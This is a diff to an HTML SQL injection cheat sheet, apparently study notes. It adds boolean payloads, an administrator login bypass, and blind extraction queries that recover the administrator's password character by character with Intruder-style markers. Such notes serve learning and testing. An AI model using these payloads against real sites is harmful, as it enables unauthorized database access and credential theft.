@@ -99,11 +99,24 @@
 <pre><div class="column" style="display: inline-block; text-align: left; background-color:gray;">
 <details>
 <summary>HIDDEN DATA TECHNIQUES</summary>
-<p><b>DESCRIPTION: </b></p>
+<p><b>DESCRIPTION:</b> It will use some boolean conditions in order to retrieve content from the database.
+
+If the vulnerability is present the goal is to "cut" the query and retrieve all, for that boolean conditions are used.
+
+<mark>' OR 1=1--</mark> TRUE
+<mark>' and 'a'='a--</mark>
+
+<mark>' and 1=2;--</mark></p>
 </details>
 <details>
 <summary>LOGIN BYPASS TECHNIQUES</summary>
-<p><b>DESCRIPTION: </b></p>
+<p><b>DESCRIPTION:</b> It is used to bypass login forms, guessing users or after collecting some of them.
+
+Sample:
+
+<mark>administrator'--</mark>
+
+</p>
 </details>
 <details>
 <summary>DATABASE TYPE/VERSION/NUMBER TECHNIQUES</summary>
@@ -198,7 +211,49 @@ STEP2: get column field type
 </details>
 <details>
 <summary>BLIND ATTACKS TECHNIQUES</summary>
-<p><b>DESCRIPTION: </b></p>
+<p><b>DESCRIPTION:</b> Simple boolean conditions can help to detect how different the site behaves. 
+Look for any new behavior after small changes.
+<details>
+<summary>CONDITIONAL RESPONSES</summary>
+	
+<mark>' AND '1'='1</mark> TRUE
+<mark>' AND '1'='2</mark> FALSE
+
+To successfully acomplish the blind attack, the boolean conditions can help. It is matter of what to ask.
+
+> <u>check if table exist ?</u>
+<mark>' AND (SELECT 'a' FROM TABLE_NAME LIMIT 1)='a</mark> | TRUE condition means table exist !
+
+> <u>check if column value exist ?</u>
+<mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='a</mark> | TRUE condition means column value exist !
+<mark>' AND (SELECT 'a' FROM users WHERE username='administrator')='a</mark>
+
+> <u>check the character lenght of the column ?</u>
+<mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE' AND LENGTH(COLUMN_NAME)>1)='a</mark>	
+<mark>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a</mark>
+
+<b>Note:</b> Here a series of incremental query's working with the TRUE statement are needed, once the number reached 
+hits the FALSE statement.
+
+> <u>check the characters of the column ?</u>
+<mark>' AND (SELECT SUBSTRING(COLUMN_NAME,1,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='§a§</mark>
+<mark>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§</mark>
+
+So, it is the same as saying, first character in the value of column_name X is equal to "A". We need to
+iterate more times with each letter, number, etc. For that reason a pre-req is to know the value lenght. 
+
+<u>CLUSTER BOMB ATTACK !</u> - two positions
+
+<mark>' AND (SELECT SUBSTRING(COLUMN_NAME,<b>§1§</b>,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='<b>§a§</b></mark>
+
+<b>Note:</b> Remember the TRUE/FALSE logic and the response associated to that. That will help to know which 
+values are correct = TRUE. 
+</details>
+<details>
+<summary>CONDITIONAL ERRORS</summary>
+
+</details>	
+</p>
 </details>
 <details>
 <summary>ERROR-BASED TECHNIQUES</summary>
